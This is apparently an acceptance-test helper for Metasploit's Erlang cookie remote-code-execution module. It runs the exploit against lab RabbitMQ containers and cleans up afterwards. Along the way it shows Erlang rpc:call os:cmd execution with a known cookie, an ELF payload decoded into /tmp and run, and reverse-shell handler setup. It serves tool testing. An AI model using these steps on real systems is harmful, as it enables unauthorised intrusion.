# frozen_string_literal: true

require 'base64'
require 'digest'
require 'shellwords'

module Acceptance
  # Native vendor RPCs and stock handlers precede original owning executions.
  module ErlangCookie
    OWNER = 'exploit/multi/misc/erlang_cookie_rce'

    def ec_json(expression)
      output = console_command("irb -e #{("puts 'EC_JSON=' + (#{expression}).to_json").inspect}")
      rows = output.lines.grep(/^EC_JSON=/)
      expect(rows.length).to eq(1), output
      JSON.parse(rows.first.delete_prefix('EC_JSON='))
    end

    def ec_save
      File.write(File.join(target_runtime.fetch('artifacts'), 'erlang-owner.json'), JSON.pretty_generate(@ec)) if @ec
    end

    def ec_rpc(service, command)
      program = "Reply=rpc:call('rabbit@#{service}',os,cmd,[unicode:characters_to_list(base64:decode(#{Base64.strict_encode64(command.b).inspect}))]),io:format(\"EC_REPLY=~s~n\",[base64:encode(iolist_to_binary(Reply))]),halt()."
      argv = target_runtime.fetch('compose') + ['exec', '-T', service, 'erl', '+S', '1:1', '+A', '1', '-noshell', '-sname', 'module_control', '-setcookie', 'MODULE_TARGET_ERLANG_COOKIE', '-eval', program]
      output, error, status = Open3.capture3(*argv)
      @ec[:native] << { service: service, command_base64: Base64.strict_encode64(command.b), stdout: output, stderr: error, exit: status.exitstatus }
      ec_save
      expect(status.success?).to be(true), output + error
      reply = output.lines.grep(/^EC_REPLY=/)
      expect(reply.length).to eq(1), output
      Base64.strict_decode64(reply.first.delete_prefix('EC_REPLY=').strip)
    end

    def ec_boot(brokers)
      @ec = { native: [], sessions: [], calibrated: [], tools: {}, baseline_tmp: {} }
      @ec[:observer] = ec_json("begin;require 'base64';require 'msf/util/exe';load 'test/module_targets/laravel/session_control.rb';load 'test/module_targets/druid_sessions/session_control.rb';load 'test/module_targets/rocketmq_sessions/session_control.rb';DruidSessionControl.install(framework);end")
      sources = %w[modules/exploits/multi/misc/erlang_cookie_rce.rb lib/rex/proto/erlang.rb lib/msf/util/exe.rb]
      @ec[:source_hashes] = sources.to_h { |path| [path, Digest::SHA256.file(path).hexdigest] }
      expect(target_exec('framework', 'sha256sum', *sources).lines.map(&:split).to_h).to eq(@ec[:source_hashes].invert)
      brokers.each do |service|
        @ec[:tools][service] = target_exec(service, 'sh', '-c', 'id rabbitmq; for tool in sh bash telnet printf base64 chmod; do printf "%s=" "$tool"; if command -v "$tool"; then :; else printf ABSENT; fi; printf "\n"; done')
        @ec[:baseline_tmp][service] = tmp_files(service)
      end
      if ENV.key?('RABBITMQ_PROFILE')
        output, status = Open3.capture2e(*target_runtime.fetch('compose'), 'rm', '--stop', '--force', '--volumes', 'client')
        @ec[:client_release] = { output: output, exit: status.exitstatus }
        expect(status.success?).to be(true), output
        output, status = Open3.capture2e(*target_runtime.fetch('compose'), 'ps', '--all', '--quiet', 'client')
        expect(status.success? && output.strip.empty?).to be(true)
      end
      ec_save
    end

    def ec_ready_session(owner, payload)
      metadata = nil
      wait_for_expect(150, 0.1) do
        ready = File.readlines(@ec.fetch(:observer).fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
        metadata = ec_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload}}').find do |row|
          ready.include?(row.fetch('id')) && row.values_at('owner', 'payload') == [owner, 'payload/' + payload]
        end
        expect(metadata).not_to be_nil
      end
      metadata
    end

    def ec_use_session(service, payload, owner, label)
      record = { service: service, payload: payload, owner: owner, label: label }
      @ec[:sessions] << record
      record[:session] = ec_ready_session(owner, payload)
      identifier = record.fetch(:session).fetch('id')
      path = "/tmp/module-target-erlang-session-#{Process.pid}-#{identifier}"
      marker = 'erlang-session-proof'
      target_exec(service, 'test', '!', '-e', path)
      record[:proof] = ec_json("LaravelSessionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect},false,component:'erlang')")
      pid = record.fetch(:proof).fetch('pid')
      record[:process_stat] = target_exec(service, 'cat', "/proc/#{pid}/stat")
      record[:birth] = record.fetch(:process_stat).rpartition(') ').last.split.fetch(19)
      record[:physical_uid] = target_exec(service, 'stat', '-c', '%u', "/proc/#{pid}").strip
      expect(record.fetch(:physical_uid)).to eq(target_exec(service, 'id', '-u', 'rabbitmq').strip)
      expect(file_owner(service, path)).to eq('rabbitmq')
      expect(target_exec(service, 'cat', path)).to eq(marker)
      record[:shutdown] = ec_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'erlang')")
      if record.fetch(:session).fetch('type') == 'meterpreter'
        expect(record.fetch(:shutdown).fetch('fresh_response')).to eq(pid)
      else
        expect(record.fetch(:shutdown).fetch('fresh_response')).to include('erlang-live')
      end
      wait_for_expect(150, 0.1) { expect(target_exec(service, 'sh', '-c', 'if test -e "$1"; then printf PRESENT; fi', 'process', "/proc/#{pid}")).to eq('') }
      ec_json("framework.sessions[#{identifier}]&.kill;true")
      expect(ec_json('framework.sessions.keys')).not_to include(identifier)
      target_exec(service, 'rm', path)
      console_command('jobs -K')
      record[:used_and_closed] = true
      ec_save
    ensure
      target_exec(service, 'rm', '-f', path) if path
      ec_save
    end

    def ec_native_session(service, payload)
      console_command('back')
      console_command('use exploit/multi/handler')
      { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'ExitOnSession' => false, 'ReverseListenerBindAddress' => '0.0.0.0' }.each { |key, value| console_command("set #{key} #{value}") }
      output = console_command('run -j -z')
      expect(output).not_to match(/Exploit failed|Exploit aborted/)
      expression = "begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;value=RocketmqSessionControl.command(job,#{payload.inspect});"
      if payload.start_with?('linux/')
        expression += 'bytes=Msf::Util::EXE.to_linux_x64_elf(framework,Base64.strict_decode64(value.fetch(:command_base64)));value.merge(executable:Base64.strict_encode64(bytes),executable_sha256:Digest::SHA256.hexdigest(bytes));end'
        generated = ec_json(expression)
        path = "/tmp/module-target-erlang-native-#{Process.pid}.elf"
        ec_rpc(service, "printf %s #{generated.fetch('executable')} | base64 -d > #{path};chmod 700 #{path}")
        expect(target_exec(service, 'sha256sum', path).split.first).to eq(generated.fetch('executable_sha256'))
        command = path
      else
        generated = ec_json(expression + 'value;end')
        command = Base64.strict_decode64(generated.fetch('command_base64'))
      end
      @ec[:native_payloads] ||= []
      @ec[:native_payloads] << { service: service, payload: payload, generated: generated }
      ec_rpc(service, "(#{command}) >/dev/null 2>&1 &")
      ec_use_session(service, payload, 'exploit/multi/handler', 'native')
      @ec[:calibrated] << [service, payload]
    ensure
      target_exec(service, 'rm', '-f', path) if path
      console_command('sessions -K')
      console_command('jobs -K')
      ec_save
    end

    def ec_sessions(service, payload, target)
      ec_native_session(service, payload) unless @ec.fetch(:calibrated).include?([service, payload])
      2.times do |index|
        original = tmp_files(service)
        output = invoke(service, { 'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'DisablePayloadHandler' => false, 'WfsDelay' => 10, 'CMDSTAGER::FLAVOR' => 'printf', 'CMDSTAGER::TEMP' => '/tmp' }, action: 'run -z', timeout: 120)
        expect(output).to match(/(?:Command shell|Meterpreter) session \d+ opened/)
        ec_use_session(service, payload, OWNER, 'owner-' + index.to_s)
        wait_for_expect(100, 0.1) { expect(tmp_files(service)).to eq(original) }
      end
    ensure
      console_command('sessions -K')
      console_command('jobs -K')
      ec_save
    end

    def ec_finish
      @ec.fetch(:baseline_tmp).each do |service, baseline|
        expect(tmp_files(service)).to eq(baseline)
        expect(target_exec(service, 'gosu', 'rabbitmq', 'rabbitmq-diagnostics', '-q', 'check_running')).to include('fully booted and running')
      end
      expect(ec_json('framework.sessions.keys')).to eq([])
      expect(ec_json('framework.jobs.keys')).to eq([])
      expect(target_exec('framework', 'sha256sum', *@ec.fetch(:source_hashes).keys).lines.map(&:split).to_h).to eq(@ec[:source_hashes].invert)
      @ec[:final_preserved] = true
      ec_save
    end
  end
end
